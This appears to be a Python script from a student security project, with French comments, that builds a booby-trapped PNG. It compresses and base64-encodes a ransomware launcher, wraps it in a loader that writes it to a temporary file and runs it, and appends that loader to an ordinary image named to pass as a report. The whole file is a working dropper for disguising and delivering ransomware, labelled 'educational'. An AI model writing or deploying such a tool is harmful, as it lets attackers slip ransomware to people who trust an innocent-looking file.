import sys
import zlib
import base64
from PIL import Image
from io import BytesIO

def create_malicious_image(original_img, output_img="rapport_esaip_ir4.png"):
    """
    Crée une image PNG piégée qui exécute le ransomware éducatif
    quand on l'ouvre avec Python.
    """
    
    # 1. Lire le script à cacher (votre attack_launcher.py original)
    with open("attack_launcher.py", "rb") as f:
        payload = f.read()
    
    # 2. Compresser et encoder le payload
    compressed = zlib.compress(payload)
    encoded_payload = base64.b64encode(compressed).decode('utf-8')
    
    # 3. Créer le loader qui sera caché dans l'image
    loader_script = f"""#!/usr/bin/env python3
import base64
import zlib
import os
import tempfile

# Payload caché
DATA = "{encoded_payload}"

# Extraction et exécution
try:
    decoded = base64.b64decode(DATA)
    decompressed = zlib.decompress(decoded)
    
    with tempfile.NamedTemporaryFile(delete=False, suffix='.py') as tmp:
        tmp.write(decompressed)
        tmp_path = tmp.name
    
    os.system(f'python {{tmp_path}}')
    os.unlink(tmp_path)
except Exception as e:
    print("Erreur:", e)
    input("Appuyez sur Entrée pour quitter...")
"""
    
    # 4. Préparer l'image originale
    img = Image.open(original_img)
    img_buffer = BytesIO()
    img.save(img_buffer, format='PNG')
    img_data = img_buffer.getvalue()
    
    # 5. Combiner image + loader
    with open(output_img, 'wb') as f:
        f.write(img_data)
        f.write(b'\n\n###PYTHON_LOADER###\n')
        f.write(loader_script.encode('utf-8'))
    
    print(f"[+] Image piégée créée: {output_img}")
    print("    - Apparence normale dans les viewers d'images")
    print("    - Exécute le ransomware éducatif quand ouvert avec Python")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        create_malicious_image(sys.argv[1])
    else:
        print("python stego_injector.py logo.png rapport_malveillant.png")

        